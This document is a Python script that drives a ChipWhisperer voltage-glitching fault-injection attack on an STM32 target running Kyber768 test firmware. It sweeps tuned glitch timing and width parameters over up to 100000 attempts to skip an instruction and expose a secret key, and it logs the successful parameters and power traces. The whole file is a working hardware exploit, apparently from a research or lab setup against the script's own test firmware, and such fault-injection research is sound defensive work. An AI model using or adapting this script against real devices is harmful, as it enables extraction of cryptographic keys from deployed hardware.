#!/usr/bin/env python3
"""
Kyber768 Instruction Skip - V9 LONG RUN
Run for 100000 attempts with golden parameters
Previous success was at attempt 4766 with 7.2% crash rate
"""

import chipwhisperer as cw
import time
import numpy as np
import os
import sys
from datetime import datetime

FW_PATH = "bin/test_glitch.hex"

# EXACT golden parameters
GOLDEN_EXT = 17
GOLDEN_WIDTH = 4
GOLDEN_OFFSET = -12

# Small jitter only
EXT_JITTER = 2   # 15-19
WIDTH_JITTER = 1 # 3-5
OFFSET_JITTER = 3 # -15 to -9

MAX_ATTEMPTS = 100000

def setup():
    print("Connecting...", flush=True)
    scope = cw.scope()
    target = cw.target(scope)
    
    scope.default_setup()
    scope.clock.clkgen_freq = 7372800
    scope.clock.adc_src = "clkgen_x4"
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.trigger.triggers = "tio4"
    target.baud = 38400
    
    # Voltage glitch - enable_only
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "enable_only"
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    scope.glitch.repeat = 1
    
    return scope, target

def reset(scope, target):
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.1)
    target.flush()

def glitch(scope, target, key, ext, w, off):
    scope.glitch.ext_offset = ext
    scope.glitch.width = w
    scope.glitch.offset = off
    target.flush()
    
    r = ""
    t = time.time()
    while time.time() - t < 0.3:
        if target.in_waiting():
            r += target.read()
            if "WAIT" in r: break
        time.sleep(0.005)
    
    if "WAIT" not in r:
        return "timeout", None
    
    scope.arm()
    if scope.capture():
        return "no_trig", None
    
    r = ""
    t = time.time()
    while time.time() - t < 0.3:
        if target.in_waiting():
            r += target.read()
            if "KEY:" in r and "\n" in r[r.find("KEY:"):]:
                break
        time.sleep(0.005)
    
    if key in r:
        return "SUCCESS", scope.get_last_trace()
    elif "KEY:" in r:
        return "normal", None
    else:
        return "crash", None

def main():
    scope, target = setup()
    
    print(f"Programming...", flush=True)
    cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
    print("OK", flush=True)
    
    reset(scope, target)
    time.sleep(0.5)
    
    out = ""
    t = time.time()
    while time.time() - t < 3:
        if target.in_waiting():
            out += target.read()
        time.sleep(0.02)
    
    if "GOLD:" not in out:
        print("ERROR: No GOLD key!", flush=True)
        scope.dis(); return
    
    key = out[out.index("GOLD:")+5:].strip().split()[0]
    if not key or len(key) < 32:
        print("Invalid key!", flush=True)
        scope.dis(); return
    
    print(f"Key: {key}", flush=True)
    print(f"Golden: ext={GOLDEN_EXT}, w={GOLDEN_WIDTH}, o={GOLDEN_OFFSET}", flush=True)
    print(f"Running {MAX_ATTEMPTS} attempts...", flush=True)
    print(f"Started: {datetime.now()}", flush=True)
    
    os.makedirs("traces_repro", exist_ok=True)
    
    ext_range = list(range(GOLDEN_EXT - EXT_JITTER, GOLDEN_EXT + EXT_JITTER + 1))
    w_range = list(range(max(1, GOLDEN_WIDTH - WIDTH_JITTER), GOLDEN_WIDTH + WIDTH_JITTER + 1))
    o_range = list(range(GOLDEN_OFFSET - OFFSET_JITTER, GOLDEN_OFFSET + OFFSET_JITTER + 1))
    
    total = crashes = timeouts = normal = 0
    
    try:
        cycle = 0
        while total < MAX_ATTEMPTS:
            cycle += 1
            for ext in ext_range:
                for w in w_range:
                    for off in o_range:
                        total += 1
                        res, trace = glitch(scope, target, key, ext, w, off)
                        
                        if res == "SUCCESS":
                            print(f"\n\n{'='*50}", flush=True)
                            print(f"SUCCESS at attempt {total}!", flush=True)
                            print(f"ext={ext}, w={w}, off={off}", flush=True)
                            print(f"{'='*50}", flush=True)
                            
                            np.save(f"traces_repro/SUCCESS_v9_e{ext}_w{w}_o{off}.npy", trace)
                            with open("KYBER_SUCCESS_V9.txt", "w") as f:
                                f.write(f"SUCCESS!\next={ext}\nwidth={w}\noffset={off}\nattempts={total}\nkey={key}\n")
                            
                            scope.dis(); target.dis()
                            return
                        
                        elif res in ("crash", "no_trig"):
                            crashes += 1
                            if crashes % 25 == 0:
                                reset(scope, target)
                                time.sleep(0.1)
                        elif res == "normal":
                            normal += 1
                        else:
                            timeouts += 1
                            if timeouts % 20 == 0:
                                reset(scope, target)
                                time.sleep(0.1)
                        
                        if total >= MAX_ATTEMPTS:
                            break
                    if total >= MAX_ATTEMPTS: break
                if total >= MAX_ATTEMPTS: break
            
            # Progress every cycle
            pct = crashes / total * 100 if total > 0 else 0
            print(f"Cycle {cycle}: {total} | Crash:{crashes}({pct:.1f}%) Norm:{normal} TO:{timeouts}", flush=True)
        
        print(f"\nNo success after {total}. Crash:{crashes} Norm:{normal} TO:{timeouts}", flush=True)
    
    except KeyboardInterrupt:
        print(f"\nStopped at {total}", flush=True)
    finally:
        scope.dis(); target.dis()

if __name__ == "__main__":
    main()
